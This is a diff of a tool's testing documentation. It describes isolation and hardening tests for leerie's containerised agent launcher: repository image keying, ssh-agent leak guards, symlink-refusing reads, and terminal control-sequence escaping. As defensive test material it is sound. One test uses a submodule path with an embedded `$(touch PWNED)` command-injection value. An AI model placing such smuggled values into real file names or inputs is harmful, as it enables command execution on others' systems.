@@ -286,13 +286,94 @@ the latter silently resolves to the real `~/.leerie/...` and the test
 asserts nothing.
 
 The local per-repo image surface — `resolve_repo_image_tag`,
-`_leerie_repo_id`, `build_repo_image`, and `ensure_base_in_buildkit_ns`
-(copies the base into the `buildkit` containerd namespace before the
-derived build so `FROM $BASE_IMAGE` resolves locally under Colima's
-namespaced buildkit; `tests/test_build_repo_image.py` pins that the copy
-fires and precedes the build, and the idempotent skip when the base is
-already present) — is tested via bash-harness subprocess tests with
-stubbed `git` and `nerdctl`.
+`_leerie_repo_id`, `build_repo_image`, and `ensure_base_in_worker_ns`
+(copies the base from leerie's containerd namespace into the one BuildKit's
+worker reads, `default` in the harness's `buildctl` stub, before the derived
+build so `FROM $BASE_IMAGE` resolves locally; `tests/test_build_repo_image.py`
+pins that the copy fires and precedes the build, the skip when the copy
+there has the base's id, and the copy again when its id differs) — is
+tested via bash-harness subprocess tests with stubbed `git`, `nerdctl` and
+`buildctl`.
+
+Leerie's generated Dockerfile is tested only by its own build (DESIGN §6½
+*Language deps*; review round 35, execution R35E-1), in
+`tests/test_build_repo_image.py`: a launch whose generated file, context,
+version and base match the recorded image runs no build at all, and the
+one that builds runs the repository image's two builds and nothing else
+(`test_an_up_to_date_generated_image_runs_no_build`); when the generated
+file's build fails (a stub `nerdctl` that fails a file holding a
+`# copy-input-shas:` line, builtins only), the launch warns, builds the
+file without the language-dep layer, and records that image under the
+generated file's key, so the next launch runs no build and keeps the key
+(`test_a_language_layer_that_does_not_build_falls_back_once`). Both fail
+at the parent tree, where a probe build ran on every launch before the
+rebuild check (3 builds and then 1). Review round 36 (execution X3): the
+fallback's record carries the `apt-only` mark, its warning names the
+`.dockerfile-hash` path to remove and no longer says "for this run", and
+the next two launches each warn that the image is the apt-only fallback;
+an image whose layer built is recorded unmarked and reused without that
+warning (in `test_an_up_to_date_generated_image_runs_no_build`).
+Falsified live (measured 2026-11-03), each restored: the mark not
+written, the reuse warning removed, the mark written for every image, and
+the old wording each fail their case.
+
+An image is keyed on the repository Dockerfile bytes leerie read (review
+round 29, isolation F4): with a committed `.leerie/Dockerfile` linked to a
+file outside the checkout, the reuse block refuses the link before any
+reuse decision even when the stored hash is that file's digest and the image
+is present (`tests/test_resolve_repo_image_tag.py::test_a_linked_dockerfile_is_never_read_nor_reused`),
+and `_set_fly_per_repo_image` names no Fly tag from that file's digest
+(`tests/test_fly_per_repo_image.py::test_a_linked_dockerfile_is_never_read`).
+Falsified: with the digest taken by path (`sha256sum`) again, each fails —
+the local block reports the image up to date and runs it, and the Fly tag
+carries the linked file's digest. In a full launch `_checkout_config_links`
+refuses a linked `.leerie/Dockerfile` first; these pin the sites
+themselves.
+
+A repository image is only its own checkout's (review round 29, isolation
+F2; `tests/test_resolve_repo_image_tag.py`): checkouts whose `<repo-id>`
+collide (`github.com/alice/app`, `evil.example/alice/app`, a directory
+named `alice-app`) get three distinct names; an image reused is run by the
+digest recorded when this checkout built it (`REPO_IMAGE_REF`); a tag that
+names another digest is rebuilt and the new digest recorded and run; a hash
+file that records no digest reuses nothing. The shared `nerdctl` stub
+(`tests/repo_image_block_extract.py`) answers the repository image's
+`RepoDigests` with `$STUB_REPO_DIGEST`, present once a harness's `build`
+branch has run. Falsified: with the launcher before this change, all four
+fail.
+
+On Fly, an image is pushed under exactly the tag asked for and a machine
+starts from the digest leerie pushed (review round 29, isolation F1).
+`tests/test_build_push_modes.py`: the remote builder's `--image-label` is
+the requested tag's label; a tag outside `registry.fly.io/<app>` is refused
+before flyctl runs; `--digest-file` records the digest a registry holds
+under the tag; `--layout-base` refuses a pushed image that is not the
+base's layers plus one with its configuration, and reports no digest for
+it; `--no-run` builds and pushes a repository's own stage without the
+local build's entrypoint check and smoke run, which start it (2 cases;
+fails with the guard removed), and `--target` is an unknown argument
+(fails with it accepted again). `tests/test_registry_image.py` drives `scripts/remote/registry_image.py`
+against `tests/fake_registry.py` (a loopback registry behind a Bearer token
+challenge): the digest, a registry whose digest disagrees with the body,
+the layout rule and each way to break it, labels left out, a linux/amd64
+pick from an index. `tests/test_fly_per_repo_image.py` and
+`tests/test_ensure_image.py` run the launcher's `ensure_image`: the cache
+records `<tag> <digest>` (and the base digest for a repository image); a
+repository image is two pushes (DESIGN §6 *One image, two roots*): the
+repository's Dockerfile, byte for byte, on the base's digest under
+`<tag>-repo` with `--no-run` and no target, then leerie's, `FROM` the base's
+digest and that push's digest, under its own tag with `--layout-base`; it is rebuilt when cached on another base; a
+cached tag without a digest is no hit; and the Fly branch hands
+`provision_machine` the digest reference. Falsified: with `build-push.sh`
+before this change, 7 of `test_build_push_modes.py`'s tests fail; with the
+launcher before it, the Fly-branch wiring test and every new
+`ensure_image` test fail. A repository image cached in another layout, or
+with none recorded, is rebuilt
+(`test_ensure_image_per_repo_in_another_layout_is_rebuilt`; fails with the
+layout condition dropped), and a run the launcher started on a repository
+image whose image has no worker root stops before anything runs
+(`tests/test_worker_root_view.py::test_a_run_started_on_a_repository_image_needs_its_worker_root`;
+fails with the check removed) (review round 29, execution L2).
 
 ## Worker cgroup containment
 
@@ -635,13 +716,396 @@ the launcher's own `set` line (read from `leerie`): a real keyless agent
 under `set -e` had ended the launcher there silently, leaking
 `.spawn.lock` (review r25 M1), while the older tests, which run without
 `set -e`, stayed green — and a failed `ssh-agent` spawn returns with a message and no lock.
+Its per-test HOME fixture stops that test's agents by PID
+(`tests/conftest.py::stop_ssh_agents_under`), not by `pkill -f`.
 
-`tests/test_resume_push_writes_pr.py` (3 tests) drives the real
+**No ssh-agent outlives the session.** The Fly seed reaches
+`require_fly_ssh`, whose spawn starts leerie's private agent under
+`${XDG_CACHE_HOME:-$HOME/.cache}/leerie/agent/`; it daemonizes, and under
+the session HOME
+nothing stopped it, so `tests/test_re_seed.py`, `tests/test_seed_repo_sh.py`,
+`tests/test_seed_inspect_dirs.py` and the seed tests importing their stubs
+leaked one agent per pytest session, on CI too. Their seeding subject does
+not need the agent: each stub `flyctl` writer also puts a no-op `ssh-agent`
+beside it (`tests/stub_helpers.py::_make_stub_ssh_agent`). The controlling
+pytest process's `pytest_sessionfinish` (`tests/conftest.py`) fails the
+session when any `ssh-agent` whose argv names the agent directory the
+product derives (`leerie_agent_dir()`) or the session's base temp
+directory (where a test's own `XDG_CACHE_HOME` puts it) is still alive,
+and stops it by PID either way. Falsified: with `_make_stub_ssh_agent` writing no stub,
+`tests/test_re_seed.py` alone exits 1 naming the agent, and none survives.
+The session's `XDG_CACHE_HOME`, `XDG_CONFIG_HOME`, `XDG_DATA_HOME` and
+`XDG_STATE_HOME` are set under its HOME, and `_home_is_never_the_users`
+fails a test that points one at the user's own home or at the value
+inherited from the user's environment (a test's own `tmp_path` is fine):
+with an `XDG_CACHE_HOME` inherited from outside, the agent lived beyond the HOME, a leaking session passed and its
+agent survived (review round 29 isolation F3).
+`tests/test_session_agent_guard.py` (1 test) runs a child session given an
+outside `XDG_CACHE_HOME` that starts the agent and does not stop it: the
+session fails, the agent was under the child's HOME, and none survives.
+Falsified: with the conftest before this, the agent's socket is under the
+outside directory and the test fails.
+
+**No test writes the user's real `~/.leerie`.** The same hook fails the
+session when the user's real `~/.leerie` (`REAL_HOME`) gains a top-level
+entry during it: names are listed at conftest's first import and compared at
+the end, read only, nothing removed. Empty `logs/` directories under names
+such as `ci-old` and `sub` had been found there. `tests/test_session_real_home_guard.py`
+(4 tests) runs a child session whose user's home is scratch: one that writes
+`~/.leerie/ci-old/logs` there fails naming it and leaves it in place, one
+that writes nothing passes. Falsified: with the comparison disabled, the
+first test fails. The per-test check refuses an XDG directory at the user's
+home and accepts one beneath `tmp_path`; and the session's own temp root is
+never the user's place, so with a TMPDIR beneath the user's home the
+session HOME and a test's `tmp_path` there are accepted.
+
+`tests/test_resume_push_writes_pr.py` (4 tests) drives the real
 `_run_phases` resume of a finished run with only `claude_p` stubbed: a resume
 continuing with a push and no `run.json.pr_title` runs `pr_writer` and records
 its title (review r25 L1: `resume <id> --push` of a finished `--no-push` run
 pushed with the fallback body); a resume continuing without a push, or of a
-run whose PR is written, runs no worker.
+run whose PR is written, runs no worker; nor does a resume of a run the host
+already pushed (`pushed_at` and `pr_url` set, no `pr_title`: its `pr_writer`
+failed at finalize and its PR is open with the fallback body; review round
+26, I1). Dropping the `pushed_at` check turns that last test red.
+
+`tests/test_host_python_is_isolated.py` (29 tests: 23 functions, two of
+them run four times each, over where the operator's `tenacity` is; DESIGN §6
+*The host never imports the repository's code* and *The host never runs a
+program the checkout chose*, review round 25 I1, round 26 F1 and I2, round
+27 isolation I2). A rule over every host-run shell file (the launcher,
+`host-finalize.sh`, `install.sh`, `runtime-install.sh`, `scripts/remote/`)
+fails any `python3` invocation without `-I`; an anti-vacuity test checks the
+scan sees the known calls, and a planted unisolated call proves it can fail.
+The reviewer's proof, inverted: the bare-resume pick seam, the
+`config --recapture` seam and the launcher's real `NO_PUSH` block run from a
+checkout holding planted stdlib-named modules, never run them, and still do
+their job. The rebaser seam (as `host-finalize.sh` writes it) and the
+recapture seam run from a checkout holding a planted `tenacity.py`, with the
+operator's `tenacity` behind a relative `PYTHONPATH` entry, in the user
+site, or behind an absolute `PYTHONPATH` entry into the checkout, and must
+import the operator's; with only a user-site `.pth` naming the checkout
+(an editable install), the interpreter's or none
+(`admit_operator_import_paths(exclude)`). The chain synth-merge helper,
+given `.`, the checkout itself and an absolute operator entry on
+`PYTHONPATH`, imports the operator's `chain.git_ops` and not the
+checkout's.
+
+The same file pins that no program the launcher starts runs in the
+checkout (round 26 I2). Shims built from shell builtins and absolute paths
+stand in front of a bounded list of 29 names, asdf-shaped: each records its
+working directory and execs the real program found before the shim
+directory went on `PATH`, so none can start another. The launcher's
+host-only verbs, run from a checkout whose `.tool-versions` names its own
+`python3`, start no shim inside it and never run the plant, and a
+`.tool-versions` cannot pick the launcher's own `python3`. The prologue's
+shape (`/bin/sh`, `cd /` before `bash` is chosen) is checked, a relative
+`--state-dir` and task file still mean the checkout's (the state dir beside
+it, since one inside is refused), and `ls-remote` starts `ssh` from `/`,
+with a `git -C` control that starts it in the checkout. Static rules reject
+a `cd` into the checkout in the host scripts and a `git submodule foreach`
+body that runs more than `printf`, require every remote git call in
+`host-finalize.sh` and the launcher to go through `_repo_git_from_root` or
+`_repo_git_push`, and chain's git runs from `/` naming the repository.
+
+Falsified on the current tree: dropping `-I` from the recapture seam, the
+bare-resume seam and the `NO_PUSH` record read turns 8 tests red (the rule,
+the three seam tests and the four recapture `tenacity` cases); replacing
+both seams' `admit_operator_import_paths(...)` call with `pass` turns 6 red
+(every rebaser and recapture case but the two `.pth` ones, which import no
+plant either way); replacing only the final drop with a no-op turns the 4
+`*_into_checkout` cases red.
+
+`tests/test_leerie_reads_never_follow_links.py` (23 tests: 20 functions;
+the credentials test runs twice, the `.claude` settings test three times,
+and `test_environ_child` is the `/proc/self/environ` child, skipped unless
+its parent runs it; DESIGN §6 *Leerie never reads through a link a
+repository holds*, review round 26 I1, round 27 isolation I3 and execution
+L2). The primitives refuse a link at the file or on the way, and a listing
+keeps only what it reached without one. The reviewer's proof, inverted: a
+PR template linked to a credentials file or to `/proc/self/environ` reaches
+no `pr_writer` payload, while the committed template does, and a link in
+the multi-template directory is not a template. Configuration, the inputs
+handed to workers, task references and the task file, a checkpoint named
+outside its notes directory and the repository's `.claude` settings are
+read never through a link, and a FIFO in a tree repository never blocks the
+orchestrator. The launcher refuses a linked `.claude`,
+`.claude/settings.json` or `.claude/settings.local.json` (a regular file
+passes). No read is unbounded: a 1 TiB sparse checkpoint gets the gate's
+error string, `_read_file_safely` of a 1 TiB sparse file returns its
+budget, the limit is exact, and a rule requires `limit=` on every reader
+call and anchored copy. The rule over the module: every function calling a
+raw read primitive is classified (87 names: 58 leerie's own, 10 the
+kernel's, 5 the operator's, 10 listings that follow no link, 4 primitives),
+and the 39 converted functions call none and decide what to read with no
+probe that follows a link (`.is_file()`, `.is_dir()`, `.exists()`,
+`os.path.*`, a copy without `src_anchor=`), but for three whose probes only
+test existence. Without that second part three converted functions
+(`_existing_mise_toml_path`, `_stage_worktree_extras`,
+`_copy_task_references`) could revert and stay green (round 27 claims C9);
+reverting `_copy_task_references`' anchored copy, or
+`_existing_mise_toml_path`'s `_regular_file_beneath`, now turns it red.
+
+Review round 27's host findings (DESIGN §6 *The host never runs a program
+the checkout chose*), each proof inverted and live-falsified:
+- `tests/test_host_worker_starts_outside_the_tree.py` (4 tests, I1): the real
+  `run_rebaser` with an asdf-shaped `claude` shim of builtins and a plant in
+  the run branch never runs the plant, starts the CLI outside the worktree
+  with `--add-dir <worktree>` and removes its start directory; the prompt
+  names the worktree; `_exe_from_root` anchors relative PATH entries at `/`;
+  `_host_worker_cwd` refuses a temporary directory inside a tree.
+- `tests/test_host_python_is_isolated.py`, 5 of its 29 tests: `config --chat`
+  starts its CLI outside the checkout, never through a relative PATH entry
+  (I1); every host `fetch` and `pull` carries `--no-recurse-submodules` (a
+  rule, its anti-vacuity check and a planted control), and the shipped
+  scratch-ref fetch of a commit moving a gitlink starts no `ssh` (I5).
+- `tests/test_host_push_starts_only_the_hook_in_the_checkout.py` (7 tests,
+  I5): a hooked push starts `ssh` in `/` (the `-C` control starts it in the
+  checkout); the operator's hook starts at the top of the work tree with
+  git's arguments, its ref lines on stdin and the operator's
+  `GIT_CONFIG_PARAMETERS`, still vetoes the push, honours a relative
+  `core.hooksPath`, and `--no-verify` still skips it.
+- `tests/test_seed_submodule_list_is_nul_delimited.py` (4 tests, I4): a
+  submodule path holding a newline and a tab lists no host repository in any
+  of the three shipped loops (the line-based control lists it); every bundle
+  name is hex, a `'` never reaches the remote shell, and the host and
+  machine sides name a bundle the same.
+- `tests/test_seed_machine_submodules.py` (5 tests, review r28 exec L2):
+  the Fly seed, the Fly inspect-dir seed and the EC2 seed each run their
+  real machine script locally, through the existing transport stubs, on a
+  checkout holding `libs/we ird<TAB>$(touch PWNED)'q"`, a plain path and a
+  submodule with a nested one, with every submodule's own URL deleted
+  first. Every submodule, the nested one included, is checked out at the
+  host's commit and nothing named `PWNED` appears; a submodule without a
+  bundle stays uninitialised; all three scripts embed
+  `_seed_machine_submodules`. Falsified: with the old machine scripts 4 of
+  the 5 are red (all three seeds exit non-zero, the EC2 one naming the
+  deleted URLs it tried to clone, and the shared-snippet pin). Writing it found the
+  Fly stub `flyctl` in `tests/test_seed_repo_sh.py` saving each submodule
+  bundle with the closing `'` of `sh -c 'cat > …'` in its name, which the
+  old machine script hid by cloning the still-reachable source URL.
+- `tests/test_host_reads_name_the_checkout.py` (8 tests, exec M1, L1, L3):
+  run from `/` with the identity only in the repository, Fly's `seed_auth`
+  and EC2's `ec2_seed_auth` ship the repository's identity; a rule forbids a
+  host file taking the checkout from its working directory, and every host
+  seam that loads the orchestrator is given `USER_REPO`; a seam's log lines
+  carry the checkout's name; the launcher refuses a deleted working
+  directory. Falsified: reverting the identity reads, one seam's
+  `USER_REPO` and the prologue's empty check turns 6 of the 8 red.
+
+`tests/test_repo_config_names_no_location.py` (25 tests: 12 functions;
+DESIGN §6 *No host path comes from a repository*, review round 27 isolation
+I6). The real launcher, started in a checkout whose `leerie.toml` sets
+`log_file`, `state_dir`, `inspect_dirs`, `judge_dir` or `heal_dir`, exits 1
+naming each key and its operator-side replacement, and creates neither
+`~/.bashrc` nor a state root; a file with only other keys, or a
+commented-out key, passes. The reviewer's harness (the resolution block
+from `_state_dir_default` through `export LEERIE_LOG_FILE_RESOLVED`, plus
+the tee-target check) resolves the default state root and log for a
+checkout naming `~/.bashrc` and `.lstate`. The launcher refuses a state root
+equal to, inside or above the checkout from the environment and the flag, a
+relative one anchored inside it, and a link into it (by real path); a
+sibling whose name starts with the checkout's passes. The launcher's key
+list is `REPO_CONFIG_OPERATOR_KEYS` (the locations first), `_read_toml_key`
+raises for each location key, and neither the orchestrator nor the launcher
+spells a read of any operator key.
+Falsified: disabling the launcher's refusal turns the 6 key tests red;
+making `_state_root_overlaps_checkout` print nothing turns the 8 overlap
+tests red; dropping `_read_toml_key`'s guard turns its 5 cases red.
+
+`tests/test_repo_config_chooses_no_authority.py` (17 test functions, 86
+cases; DESIGN §6 *A
+repository chooses no operator authority*). The real launcher, started on a
+fresh run (`--no-push "fix the bug"`) from a checkout whose `leerie.toml`
+sets any one of the 25 `REPO_CONFIG_AUTHORITY_KEYS` (`runtime`, the AWS and
+`ec2_*` keys, `fly_disk_gb`, `dangerously_*`, the gate `skip_*` keys,
+`worker_memory_max`, `worker_pids_max`), exits 1 naming the key with its flag
+and env var, runs none of the shimmed `aws`, `flyctl`, `fly`, `nerdctl`,
+`ssh`, and creates no state root; repository facts (`effort_*`, `model`,
+`max_workers`, `no_push`, `strict_conformer`, `skip_repo_map`, `seed_depth`)
+pass. `_read_toml_key` raises for each authority key; every waiver resolver
+ignores `<key> = true` in the file and still honours its env var;
+`resolve_runtime`, `resolve_worker_pids_max` and `resolve_worker_memory_max`
+ignore the file. A checkout settings file git tracks adds nothing to
+`_confined_cli_settings` (no `apiKeyHelper`, `permissions` or
+`ANTHROPIC_BASE_URL`; logged) while an untracked one does, and a checkout
+git cannot read counts as tracked; the launcher's own
+`_checkout_file_tracked` / `_operator_claude_settings` /
+`detect_bedrock_mode` (extracted by `tests/bedrock_extract.py`) do not enter
+Bedrock mode from a tracked `settings.json` or `settings.local.json` and
+warn naming the keys, while an untracked one and `~/.claude/settings.json`
+still do. Falsified: dropping `runtime` and `skip_acceptance_check` from the
+launcher's list turns 4 red (with the list-equality test in
+`test_repo_config_names_no_location.py`); giving
+`resolve_skip_acceptance_check` its file tier back turns 1 red; treating every
+checkout settings file as the operator's in the orchestrator turns 2 red, and
+in the launcher 2 red. The Bedrock tests (`test_bedrock_mode.py`), the
+settings-layer tests (`test_worker_commands_cannot_reach_the_cli.py`) and
+the resolver tests that used to pin a `leerie.toml` tier for these keys now
+make their checkout a git repository whose settings are untracked, or
+assert the file is never read.
+Review round 31 S1 (11 cases): a checkout cloned with
+`--recurse-submodules` whose `.claude` is a submodule, and one with a
+repository cloned into `.claude` that the superproject's index does not
+record, each with both settings files: neither file is a worker's settings
+layer (`_checkout_settings_are_operators`, via `_checkout_file_tracked`) or
+chooses Bedrock (the launcher's `_checkout_file_tracked`), though the
+superproject's `ls-files` names neither; the operator's untracked
+`.claude/settings.local.json` beside a submodule elsewhere still does both
+(control); and a report the task names inside such a directory is not
+inlined (`_d1_report_sources`) while the operator's own untracked report
+is. `tests/test_launcher_per_repo_image.py::test_a_submodules_generated_dockerfile_is_not_overwritten`
+covers the same rule at the launcher's `.leerie/Dockerfile` refresh, and
+`tests/test_requirement_coverage.py`'s phase test makes its checkout a git
+repository (a report is inlined only when git says no repository holds
+it). Falsified against the code before the fix (the tests kept): all 11
+S1 cases and the Dockerfile case fail, the control through the extracted
+launcher block, which the fix renamed (`tests/bedrock_extract.py` now
+extracts `_checkout_file_tracked` from before the Dockerfile refresh, where
+it is defined, and `_operator_claude_settings` onward).
+
+`tests/test_a_path_is_the_file_not_its_spelling.py` (11 test functions;
+DESIGN §6 *A path is the file it names, not its spelling*; review round 28
+isolation A1): a hard link standing in for a case-insensitive alias — a
+tracked `.claude/settings.json` reached by another spelling is the
+operator's (`_checkout_settings_are_operators`, `_checkout_file_tracked`,
+`_index_holds`; the launcher's `_checkout_file_tracked`, exit 3 only for
+untracked),
+protected paths compare folded (`_path_fold`), path lists are read with
+`-z`, and `check_diff_scope` refuses a second spelling
+(`_fold_collisions`). 16 cases fail against the parent.
+
+`tests/test_host_cli_loads_nothing_from_the_tree.py` (4 test functions, 6
+cases; DESIGN §6 *The host never runs a program the checkout chose*, part 4;
+review round 28 isolation C1, C2): the real `run_rebaser` (`_invoke`
+captured) and the launcher's `config --chat` (builtins-only stub `claude`)
+pass `--setting-sources user`, `--disable-slash-commands`,
+`--strict-mcp-config`, deny Agent/Task/Skill, pin
+`CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=0` in the environment and the
+`--settings` env, and put `--` before the first message. All 6 fail with
+the wiring removed.
+
+`tests/test_terminal_text.py` (13 test functions, 16 cases; DESIGN §6 *No
+text leerie did not
+write reaches the operator's terminal as a control sequence*; review round
+30 isolation T1), with an OSC 52 sequence, a CSI, a C1 CSI, a bidi
+override, U+2028, BEL and CR: `_terminal_text` escapes each, keeps newline
+and tab, and is idempotent; `scripts/terminal-text.py` is the same rule
+over U+0000–U+2FFF and surrogates, and relays bytes fed one at a time (a
+split UTF-8 character, a byte that is not UTF-8); `log()` and `die()`; a
+worker's JSON string printed through `main()`'s guarded `sys.stdout`; the
+run log's tee, both copies; a repository-image file name through
+`_require_worker_view`'s `die`; the real launcher, piped, relaying a stub
+container's output; and the launcher's, `lib.sh`'s and `ec2-ssm.sh`'s
+relays naming `_terminal_relay`. All 9 fail without the change; the
+launcher test fails with only the relay taken out of the piped branch.
+Review round 31 (T2, execution F1, F2, F4) added 4 functions, 6 cases, each
+with a producer of shell builtins printing the sequences: `build_repo_image`
+with a `nerdctl` that prints on stdout and stderr and exits 0 or 1 (both
+streams escaped; the build's own status still decides), `_fly_push` with a
+`build-push.sh` doing the same (the digest taken on 0, nothing on 1), the
+real launcher's `leerie config` over a `.leerie/config.toml` and a
+`leerie.toml` holding them, and `host_prepush_preflight` with a real
+pre-push hook printing them. `tests/test_host_finalize_sh.py` (2 more, 38
+functions, 40 cases) drives `host_finalize`: a failed push's hook output
+and a repository's `pr_base_branch` holding U+202E, and an unusable
+rebaser payload, reach stderr escaped. Falsified against the code before
+the fix: all 8 cases fail. Since the repository image is two builds
+(DESIGN §6 *One image, two roots*) the `build_repo_image` case has a third
+value, leerie's build failing after the repository's succeeded (falsified:
+with that build's status check removed it fails). Harnesses that run an extracted launcher block
+now source the real `scripts/remote/_log.sh` (`tests/conftest.py`'s
+`LOG_SH_SOURCE`, before their own `remote_log` stub: `test_build_repo_image`,
+`test_dockerfile_autogen`, `test_dockerfile_bake_from_capture`,
+`test_ensure_image`, `test_fly_per_repo_image`,
+`test_launcher_per_repo_image`, `test_config_verb`, `test_capture_validation`;
+`tests/log_file_extract_helpers.py`'s `extract_terminal_relay` sources it
+too, since the relay finds `terminal-text.py` beside `_log.sh`); the
+`nerdctl` stub (`tests/repo_image_block_extract.py`) records a build in a
+file, since the build now runs in a pipeline; and the `python3` stubs that
+stand in for the rebaser seam (`tests/test_host_finalize_sh.py`,
+`tests/test_host_finalize_rebase.py`) hand the terminal filter to
+`/usr/bin/python3` by absolute path — one of them ended in `exec
+/usr/bin/env python3`, which found the stub again and looped once the
+filter called `python3`.
+
+Review round 32. `tests/test_confined_terminal.py` (11 test functions, 17
+cases; DESIGN §6 *No confined process holds or can open the operator's
+terminal*, isolation P1 and round 33's Q1) hands the real shim a real pty whose master holds
+a typed line, and a probe that writes OSC 52 to fd 0, reads fd 0 and opens
+`/dev/tty`: a pty on stdin becomes `/dev/null` and nothing reaches the
+master or is read from it (plain and `--isolate`); a pty on fd 1, fd 2 or
+another passed fd exits 126 without running the command (3 cases); a shim
+started inside a session whose controlling terminal is the pty (as
+`_ts_script_run` starts it) cannot open `/dev/tty` (plain and `--isolate`);
+a shim leading a session that has one exits 126; and `_run_streaming`,
+`run_proc` and `_ts_script_run`, with the shim taken out, give the command
+`/dev/null` while the test process's fd 0 is a pty. The `--isolate` cases
+skip on a host that cannot build a sandbox; run in the `leerie:0.43.0`
+image (the test file under a stub `pytest`), both pass, and with
+`leave_terminal()` taken out the stdin case reads the typed line from
+`/dev/pts/0`. Falsified on the host: with `leave_terminal()` taken out the
+6 plain shim cases fail; with the spawners' `stdin=DEVNULL` taken out the 3
+spawner cases fail; all 9 fail against the parent. Round 33 (Q1: under
+`nerdctl run -it` the operator's pty is `/dev/console`, which every grant
+read) added 4 functions, 6 cases: with the real shim, the real
+`_WORKER_DEVICES` and the real `_reads_outside`, the test's pty (by its
+`/dev/pts/<n>` name) and `/dev/console` do not open, and null, zero,
+random, urandom and full still work (plain and `--isolate`); no read grant
+`_reads_outside` makes resolves into `/dev`, and `_WORKER_DEVICES` is
+exactly the seven nodes; the confined shim exits 126 without running the
+command when its `CONSOLE` (pointed at the test's pty) opens under a grant
+of `/` and `/dev/pts`, and runs under leerie's grants; and an isolated
+process's `/dev`, under a grant of `/`, lists exactly the six nodes, the
+five links, `pts` and `shm`, its `pts` only `ptmx`, and a pty opens as
+`/dev/pts/0`. `_shim_argv` now reads every top-level entry but `/dev` and
+`/tmp`, as leerie's grants do. On the host (no user namespaces) 4 fail
+against the parent: the plain pty case (the typed line read, its echo
+turned off), the console check (the command ran), `/dev` in the reads, and
+the AppArmor rule. In the `leerie:0.43.0` image under `nerdctl run -it` and
+the rootless drop all 17 run, and against the parent 5 fail: those three
+of `test_confined_terminal.py`, plus the isolated pty case (`/dev/console`
+opened and its echo turned off) and the isolated `/dev` (it lists
+`console`, `core` and `mqueue`). In `tests/test_launcher_secopt.py` (13
+functions, 13 cases)
+`test_profile_allows_exactly_the_shims_mounts` pins the private `/dev`'s
+tmpfs rule, and `test_profile_keeps_every_rule_a_released_shim_needs` pins
+0.43.0's allow rules (DESIGN §6 *The profile only grows*): the private
+`/dev` no longer binds `/dev/pts/ptmx` over `/dev/ptmx`, but a 0.43.0
+container still running when the profile is reloaded does, so that rule
+stays; with it deleted the test fails.
+`tests/test_terminal_safe_messages.py` (4 functions, 4 cases; execution
+X3) is the static rule by source: every message in the launcher,
+`scripts/host-finalize.sh` and `scripts/remote/*.sh` that expands
+a variable read from `leerie.toml`, `.leerie/config.toml`, `run.json` or a
+git command printing names or text does so inside `_terminal_safe` or on a
+`_terminal_relay` line; every script sourcing `_log.sh` is scanned; and the
+rule finds 4 raw synthetic shapes (in place, through a path variable,
+through a reading function, propagated from git text) and passes 4 safe
+ones (escaped, relayed, a count and an object id, never printed). It found
+88 raw messages on the parent; with either seed-knob message unwrapped it
+fails. `tests/test_launcher_seed_depth_resolution.py`'s
+`test_a_committed_value_reaches_the_terminal_escaped` (1 function, 2
+cases; the file has 12 functions, 18 cases) runs the
+launcher's seed-knob block over a committed OSC 52 value; both fail
+against the parent. `tests/test_group_launcher_verbs.py`'s
+`TestStoredTextIsEscaped` (4 functions, 4 cases; the file has 31
+functions, 31 cases; isolation P2) puts a hook's OSC 52
+in `push_error` and `started_at` and runs the real launcher's `status
+<group-id>`, `status <chain-id>`, `list --groups` and `list chains`: no
+control byte reaches stdout or stderr, and the escaped form is in the
+table. All 4 fail with the cell filter taken out.
+
+`tests/test_state_root_apart.py` (10 tests; part 3 of the same section).
+`_require_state_root_apart` over a planted `/proc/self/mountinfo`: a state
+root bind-mounted from inside the checkout, one holding the checkout, and
+the same directory under two mounts stop the run (the first also shows the
+reviewer's mechanism, `_around(["/work"], Path("/leerie-state"))` keeping
+`/work` whole); the default sibling layout, a prefix-sharing name and
+another device pass; octal escapes are decoded and the mount on top wins.
+On the real mounts, a state root nested by path (the direct-call default)
+and two separate directories pass. Falsified: never stopping turns the 4
+stopping tests red.
 
 ## fetch_branch, config, and group verbs
 
@@ -649,19 +1113,19 @@ The `fetch_branch()` stream-back surface (`scripts/remote/fetch-branch.sh`)
 is tested across two files. `tests/test_fetch_branch_sh.py` covers run
 discovery, bundle fetch, run-state tar (`run.json`, its `no_push` included,
 arrives unchanged), and baseline Step
-4 stream-back (the Dockerfile streamed when the host has none, a machine
-`config.toml` not streamed, never clobbers an existing host file, non-fatal
-on absent machine files, respects `LEERIE_STATE_HOST_DIR`) via bash-harness
-subprocess tests with a stubbed `flyctl`. The expanded Step 4 contracts are
-covered by `tests/test_fetch_branch_leerie_streamback.py` (imports stub
-helpers from `test_fetch_branch_sh` to avoid duplication): the run's
-recorded capture (`captured-deps.json`, home with the run directory) is
-merged into the user's `.leerie/config.toml` and the Dockerfile streamed;
-a hand-edited config is merged with, not clobbered; an existing Dockerfile
-is never clobbered; non-fatal when nothing is there; a machine
-`config.toml` is not streamed; `LEERIE_STATE_HOST_DIR` takes the run
-directory and the Dockerfile while the capture still goes to the user's
-checkout (DESIGN §6½ *The host applies a capture*).
+4 (nothing streamed from the machine's `/work/.leerie/`, an existing host
+file never clobbered, non-fatal on absent machine files, no Dockerfile
+written under `LEERIE_STATE_HOST_DIR`) via bash-harness subprocess tests
+with a stubbed `flyctl`. The expanded Step 4 contracts are covered by
+`tests/test_fetch_branch_leerie_streamback.py` (imports stub helpers from
+`test_fetch_branch_sh` to avoid duplication): the run's recorded capture
+(`captured-deps.json`, home with the run directory) is named, with
+`leerie config --apply-capture <run-id>`, and nothing is applied; a
+hand-edited config is left as it is; no machine `Dockerfile` or
+`config.toml` is streamed, and an existing host Dockerfile is never
+clobbered; non-fatal when nothing is there; `LEERIE_STATE_HOST_DIR` takes
+the run directory and nothing else (DESIGN §6½ *The operator applies a
+capture*).
 
 The `leerie config` verb (all four sub-modes: `--init`, bare, `--chat`,
 `--recapture`) is tested in `tests/test_config_verb.py` via a
@@ -873,7 +1337,7 @@ non-retryable) so the pin fails loudly rather than silently if that changes.
 `OWNED_REGION_FILE_ESCAPE` is **gating** where the neighbouring
 `NO_PLANNED_FILES_TOUCHED` is advisory, and the distinction is provenance, not
 shape: `files_likely_touched` is a planner *guess* (re-driving on it produced a
-measured pure-rename commit, POSTMORTEM-2026-08-14 F23), while
+measured pure-rename commit; tests/test_advisory_signals_match_their_status.py), while
 `owned_region["file"]` is code-computed by `_subfile_split`. Two anti-vacuity
 pins keep it from firing where it shouldn't — `r7`'s compliant shape, and an
 ordinary subtask with no `owned_region` at all.
@@ -1940,10 +2404,9 @@ upload-only): a branch committed on the instance round-trips to the host as a
 fetchable bundle whose tip matches the instance-side tip; the run-state tar
